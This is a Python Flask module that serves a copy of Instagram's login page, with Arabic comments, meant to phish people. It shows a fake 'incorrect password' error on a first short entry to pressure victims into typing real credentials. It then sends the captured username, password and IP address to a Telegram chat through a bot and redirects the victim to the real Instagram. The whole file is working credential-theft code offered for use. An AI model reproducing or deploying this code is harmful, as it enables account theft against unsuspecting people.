import os
from flask import Blueprint, render_template_string, redirect, request

instagram_bp = Blueprint('instagram', __name__)

# قالب انستقرام المطابق للأصل 100% مع نظام التحقق الذكي لمنع البيانات الوهمية
IG_PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }
        .main-container {
            max-width: 350px;
            width: 100%;
        }
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            font-family: system-ui, -apple-system, sans-serif;
            font-size: 32px;
            font-weight: bold;
            letter-spacing: -1px;
            margin-bottom: 30px;
            color: #262626;
        }
        .login-card input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 12px;
            outline: none;
            padding: 9px 8px;
            width: 100%;
            margin-bottom: 6px;
        }
        .login-card input:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 7px;
            margin-top: 10px;
            margin-bottom: 15px;
        }
        .login-btn:hover {
            background-color: #1877f2;
        }
        .error-box {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
            text-align: center;
            line-height: 18px;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }
        .line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .forgot-pass {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 12px;
        }
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-card">
            <div class="logo">Instagram</div>
            
            <!-- رسالة خطأ انستقرام الوهمية لإجباره على كتابة البيانات الصحيحة -->
            <div id="error-msg" class="error-box">
                Sorry, your password was incorrect. Please double-check your password.
            </div>

            <form method="POST" id="loginForm" onsubmit="return validateData(event)">
                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
                
                <div class="divider">
                    <div class="line"></div>
                    <div class="or-text">OR</div>
                    <div class="line"></div>
                </div>

                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass">Forgot password?</a>
            </form>
        </div>

        <div class="signup-card">
            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
    </div>

    <script>
        let attempt = 0;
        function validateData(event) {
            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();
            const errorBox = document.getElementById('error-msg');

            // إذا حاول الضحية كتابة يوزر أو باسورد قصير أو عشوائي في أول محاولة
            if (attempt === 0 && (pass.length < 4 || user.length < 3)) {
                event.preventDefault(); // منع الإرسال
                errorBox.style.display = 'block'; // إظهار خطأ انستقرام
                attempt++;
                return false;
            }
            return true; // في المحاولة الثانية يرسل البيانات الحقيقية للبوت
        }
    </script>
</body>
</html>
"""

def init_instagram_routes(app, bot):
    @app.route('/ig_login.php', methods=['GET', 'POST'])
    def ig_trap():
        target_chat_id = request.args.get('id', None)
        if request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            
            if target_chat_id:
                alert_msg = (
                    "📸 **تم التقاط صيد انستقرام الحقيقي بنجاح!**\n\n"
                    f"👤 **المستخدم/الرقم:** `{username}`\n"
                    f"🔑 **كلمة السر:** `{password}`\n"
                    f"🌐 **عنوان الـ IP:** `{source_ip}`"
                )
                try:
                    bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"[-] Telegram Error: {e}")
            return redirect("https://www.instagram.com", code=302)
        return render_template_string(IG_PHISH_TEMPLATE)
